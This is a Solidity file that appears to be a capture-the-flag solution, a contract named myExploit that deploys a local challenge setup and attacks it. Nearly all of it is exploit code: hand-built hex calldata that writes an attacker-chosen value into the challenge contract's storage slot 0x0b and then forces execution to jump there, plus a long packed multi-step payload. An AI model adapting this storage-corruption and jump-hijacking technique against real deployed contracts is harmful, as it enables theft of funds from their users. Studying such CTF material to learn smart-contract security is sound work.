// SPDX-License-Identifier: MIT
// solhint-disable-next-line
pragma solidity 0.7.6;
// pragma abicoder v1; //this is active by default in Solidity <0.8.x


import "./mySetup.sol";

contract myExploit {

    address payable public challengeAddress;
    address payable public setupAddress;
    ChallengeInterface public challengeInterface;
    mySetup public setup;


    constructor() payable {
        require(msg.value == 51 ether);
        setup = new mySetup{value: 50 ether}();
        setupAddress = payable(address(setup));
        challengeAddress = setup.challengeAddress();
        challengeInterface = ChallengeInterface(challengeAddress);
    }

    function storeInSlot0x0b() public {
        challengeAddress.call{value: 0}(hex"27f83350c0dec0dec0dec0dec0dec0dec0dec0dec0dec0dec0dec0dec0dec0dec0dec0de");
    }

    function jumpToLocationInSlot0x0b() public {
        challengeInterface.buyTokens{value: 0x01}();
    }

    function step1() public {
        //This function will store the 19fc into the 11th storage slot
        bytes memory step1Data = hex"27f8335000000000000000000000000000000000000000000000000000000000000019fc";
        challengeAddress.call(step1Data);
    }

    function step2() public {
        bytes memory iter1 = hex"000000000000000000000000000000000000000000000000000000000000000100000000000000000000000000000000000000000000000000000000000019fc000000000000000000000000000000000000000000000000000000000000008400000000000000000000000000000000000000000000000000000000000019fc";
        bytes memory iter2 = hex"0000000000000000000000000000000000000000000000000000000000000366000000000000000000000000000000000000000000000000000000000000000100000000000000000000000000000000000000000000000000000000000019fc0000000000000000000000000000000000000000000000000000000000000104";
        bytes memory iter3 = hex"000000000000000000000000037fc82298142374d974839236d2e2df6b5bdd8f000000000000000000000000000000000000000000000000000000000000156300000000000000000000000000000000000000000000000000000000000019fc0000000000000000000000000000000000000000000000000000000000000184";
        bytes memory iter4 = hex"0000000000000000000000000000000000000000000000000000000000000AF70000000000000000000000001111111111111111111111111111111111111111000000000000000000000000000000000000000000000000000000000000102A0000000000000000000000000000000000000000000000000000000000000204";
        bytes memory iter5 = hex"000000000000000000000000000000000000000000000002b5e3af16b1880004000000000000000000000000000000000000000000000000000000000000191b0000000000000000000000000000000000000000000000000000000000000c4a000000000000000000000000deaDDeADDEaDdeaDdEAddEADDEAdDeadDEADDEaD";
        bytes memory altogether = abi.encodePacked(hex"d0febe4c", iter1, iter2, iter3, iter4, iter5);
        challengeAddress.call{value: 0x04}(altogether);
    }


    function checkSolved() public view returns (bool) {
        return setup.isSolved();
    }
}